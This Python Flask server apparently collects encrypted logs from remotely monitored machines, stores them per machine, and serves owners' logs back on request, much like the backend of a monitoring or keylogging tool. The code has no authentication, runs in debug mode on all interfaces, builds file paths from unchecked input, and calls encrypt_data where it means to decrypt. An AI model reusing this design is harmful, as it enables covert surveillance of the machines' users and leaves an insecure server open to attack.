from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import logging
from utilities.file_utils import *
from utilities.help_utils import *
from utilities.config import *
from utilities.encryption_utils import *

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(message)s', filename='log.txt', filemode='w')


@app.route('/api/upload', methods=['POST'])
def upload_data():
    """
    Handles the upload of encrypted data from a machine.

    Process:
    - Extracts machine name from the first 14 bytes.
    - Decrypts the remaining data.
    - Splits log data and saves it to a file.

    Returns:
        JSON response with status and file path or an error message.
    """

    data = request.data
    try:
        # machine_name = data[:14].decode('utf-8')
        # machine_folder = create_machine_folder(machine_name)
        decrypted_data =  encrypt_data(data)
        if not decrypted_data:
            logging.info('No data received to the server.')
            return jsonify({'message': 'No input decrypted_data provided'}), 400

        machine_name, log_data, apps,  data = split_data(decrypted_data)
        machine_folder = create_machine_folder(machine_name)

    except Exception as e:
        logging.error(e)
        return jsonify({'status': False, 'message': str(e)}), 400

    file_path = os.path.join(machine_folder, generate_log_filename())
    with open(file_path, 'a') as f:
        f.write("--- "+log_data + ' ---\n' + data + '\n' * 2 )
    logging.info('Data saved to ' + file_path)
    return jsonify({"status": "success", "file": file_path}), 200


@app.route('/api/list_machines_target_get', methods=['GET'])
def list_machines():
    """
    Retrieves a list of monitored machines.

    Process:
    - Checks if the data folder exists.
    - Fetches machine names and their owners.
    - Encrypts the data before sending.

    Returns:
        JSON response with encrypted owner names and machine names or an error message.
    """
    if not os.path.exists(DATA_FOLDER):
        return jsonify([]), 400
    machines = get_machine_name_list()
    if not machines:
        return jsonify([]), 400
    names_of_owners = get_list_of_owners(machines)
    encrypted_owners = [encrypt_data(owner) for owner in names_of_owners]
    encrypted_machines = [encrypt_data(machine) for machine in machines]
    return jsonify(encrypted_owners, encrypted_machines),200

@app.route('/api/computer_data/<owner_name>', methods=['GET'])
def computer_data(owner_name):
    """
    Fetches stored logs for a given machine owner.

    Parameters:
        owner_name (str): Name of the machine owner.

    Returns:
        JSON response with decrypted logs or an error message.
    """

    try:
        computer_name = get_machine_name(owner_name)
    except:
        return jsonify({'status': False, 'message': 'Machine not found'}), 400
    data = ''
    for filename in os.listdir(os.path.join(DATA_FOLDER, computer_name)):
        if os.path.isfile(os.path.join(DATA_FOLDER, computer_name, filename)):
            with open(os.path.join(DATA_FOLDER, computer_name, filename), 'r') as file:
                data += file.read() + '\n\n'

    return jsonify({"data": encrypt_data(data)}), 200

if __name__ == '__main__':
    app.run(debug=True , host= '0.0.0.0')







